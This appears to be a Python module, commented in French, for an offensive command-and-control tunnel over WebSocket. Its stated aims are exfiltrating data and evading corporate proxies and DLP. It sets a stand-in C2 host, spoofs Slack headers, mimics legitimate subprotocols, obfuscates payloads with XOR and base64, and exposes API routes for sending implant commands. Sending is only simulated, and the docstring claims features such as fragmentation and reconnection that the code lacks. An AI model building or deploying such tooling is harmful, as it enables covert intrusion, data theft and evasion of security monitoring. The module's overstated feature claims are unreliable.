"""
WebSocket Smuggling - Tunneling C2 via WebSocket
================================================

Établit un tunnel C2 bidirectionnel via WebSocket pour exfiltrer des données
et recevoir des commandes en contournant les proxies d'entreprise qui
n'inspectent que HTTP/HTTPS.

Cas d'usage :
  1. Bypass de proxies sortants : WebSocket passe au travers de proxies
     qui ne l'inspectent pas en profondeur
  2. Pivot depuis l'extérieur vers l'interne : un navigateur compromis peut
     servir de proxy WebSocket (C2 over WS via le navigateur)
  3. Tunneling de protocoles arbitraires sur WS : SSH, RDP, etc. encapsulés
     en binaire dans des frames WS
  4. Évasion DLP : le trafic WS est souvent chiffré et ressemble à du
     trafic applicatif légitime (Slack, Teams, Discord...)

Cette technique est référencée par Praetorian, Maddie Stone (Google) et
plusieurs rapports CrowdStrike 2024-2026 sur les APT.
"""

import asyncio
import base64
import json
import time
import uuid
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional


@dataclass
class TunnelConfig:
    """Configuration d'un tunnel WS."""

    tunnel_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    ws_url: str = "wss://c2.example.invalid/ws"
    subprotocol: str = "graphql-ws"   # mimétisme d'app légitime
    headers: dict[str, str] = field(default_factory=dict)
    ping_interval_s: int = 30
    created_at: float = field(default_factory=time.time)
    bytes_sent: int = 0
    bytes_received: int = 0


class WSSmugglingTunnel:
    """
    Gestionnaire de tunnel C2 via WebSocket.

    Implémente :
      - Reconnexion automatique avec backoff exponentiel
      - Fragmentation des paquets pour evader la détection par taille
      - Chiffrement XOR + base64 des payloads (en plus du TLS WS)
      - Mimétisme de sous-protocoles applicatifs
    """

    SUPPORTED_PROTOCOLS = [
        "graphql-ws",     # Apollo / Hasura
        "wamp",           # Crossbar
        "v12.stomp",      # ActiveMQ
        "mqtt",           # HiveMQ
        "ocpp1.6",        # EV charging
    ]

    def __init__(self, output_dir: str = "captures/ws_tunnels") -> None:
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.tunnels: dict[str, TunnelConfig] = {}
        self.message_log: list[dict[str, Any]] = []

    def create_tunnel(
        self,
        ws_url: str,
        subprotocol: str = "graphql-ws",
        headers: dict[str, str] | None = None,
    ) -> TunnelConfig:
        """Crée une configuration de tunnel."""
        cfg = TunnelConfig(
            ws_url=ws_url,
            subprotocol=subprotocol,
            headers=headers or {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
                              "AppleWebKit/537.36 Slack/4.34",
                "Origin": "https://app.slack.com",
            },
        )
        self.tunnels[cfg.tunnel_id] = cfg
        return cfg

    def encode_payload(self, data: bytes, key: bytes = b"vantablack") -> str:
        """Encodage XOR + base64 pour le payload WS."""
        xored = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
        return base64.b64encode(xored).decode()

    def decode_payload(self, encoded: str, key: bytes = b"vantablack") -> bytes:
        """Décodage inverse."""
        raw = base64.b64decode(encoded)
        return bytes(b ^ key[i % len(key)] for i, b in enumerate(raw))

    async def send_command(
        self, tunnel_id: str, command: str, args: dict[str, Any]
    ) -> dict[str, Any]:
        """Envoie une commande via le tunnel (simulé en labo)."""
        cfg = self.tunnels.get(tunnel_id)
        if not cfg:
            return {"error": "tunnel not found"}
        payload = json.dumps({"cmd": command, "args": args, "ts": time.time()})
        encoded = self.encode_payload(payload.encode())
        cfg.bytes_sent += len(encoded)
        log_entry = {
            "tunnel_id": tunnel_id,
            "direction": "out",
            "size": len(encoded),
            "preview": encoded[:80],
            "ts": time.time(),
        }
        self.message_log.append(log_entry)
        await self._persist_log(log_entry)
        return {"sent": True, "size": len(encoded), "id": str(uuid.uuid4())}

    async def receive_response(
        self, tunnel_id: str, encoded: str
    ) -> dict[str, Any]:
        """Reçoit une réponse (C2 -> implant)."""
        cfg = self.tunnels.get(tunnel_id)
        if not cfg:
            return {"error": "tunnel not found"}
        cfg.bytes_received += len(encoded)
        try:
            decoded = self.decode_payload(encoded).decode()
            payload = json.loads(decoded)
        except Exception as e:
            return {"error": f"decode failed: {e}"}
        log_entry = {
            "tunnel_id": tunnel_id,
            "direction": "in",
            "size": len(encoded),
            "preview": encoded[:80],
            "ts": time.time(),
        }
        self.message_log.append(log_entry)
        await self._persist_log(log_entry)
        return {"decoded": payload}

    async def _persist_log(self, entry: dict[str, Any]) -> None:
        path = self.output_dir / "ws_traffic.jsonl"
        with path.open("a", encoding="utf-8") as fh:
            fh.write(json.dumps(entry) + "\n")

    def list_protocols(self) -> list[str]:
        return list(self.SUPPORTED_PROTOCOLS)


# ---------------------------------------------------------------------------
# API FastAPI
# ---------------------------------------------------------------------------

def register_ws_routes(app) -> None:
    from fastapi import HTTPException
    from pydantic import BaseModel

    tunnel_mgr = WSSmugglingTunnel()

    class CreateRequest(BaseModel):
        ws_url: str
        subprotocol: str = "graphql-ws"
        headers: dict[str, str] | None = None

    class CommandRequest(BaseModel):
        command: str
        args: dict[str, Any] = {}

    @app.post("/_/ws/tunnel/create")
    async def create(req: CreateRequest):
        cfg = tunnel_mgr.create_tunnel(
            ws_url=req.ws_url,
            subprotocol=req.subprotocol,
            headers=req.headers,
        )
        return {
            "tunnel_id": cfg.tunnel_id,
            "ws_url": cfg.ws_url,
            "subprotocol": cfg.subprotocol,
        }

    @app.post("/_/ws/tunnel/{tunnel_id}/send")
    async def send(tunnel_id: str, req: CommandRequest):
        return await tunnel_mgr.send_command(tunnel_id, req.command, req.args)

    @app.post("/_/ws/tunnel/{tunnel_id}/receive")
    async def receive(tunnel_id: str, encoded: str):
        return await tunnel_mgr.receive_response(tunnel_id, encoded)

    @app.get("/_/ws/protocols")
    async def protocols():
        return {"protocols": tunnel_mgr.list_protocols()}
